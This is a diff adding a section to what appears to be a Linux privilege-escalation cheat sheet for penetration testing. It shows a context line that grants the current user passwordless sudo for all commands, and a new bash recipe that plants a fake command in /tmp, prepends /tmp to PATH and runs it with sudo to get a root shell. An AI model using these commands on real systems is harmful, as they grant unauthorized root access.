@@ -288,6 +288,26 @@ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 ```
 > - [HackTricks: Edit Sudoers](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d)
 
+### Command Forgery (NOPASSWD)
+```bash
+# If a command can be executed as root with NOPASSWD 
+# Example `sudo -l output: `(root) NOPASSWD: /path/to/somecmd`
+# This works when there's a misconfiguration in the sudo environment
+
+# 1. Creat the same command
+cat << EOF > /tmp/somecmd
+#!/bin/bash
+/bin/bash
+EOF
+chmod +x /tmp/somecmd
+
+# 2. Prepend /tmp to the PATH environment variable and execute the command using sudo
+export PATH=/tmp:$PATH
+sudo somecmd
+```
+> - https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/
+
+
 ## Systemctl
 
 ### Sudo/SUID Permissions on `systemctl`
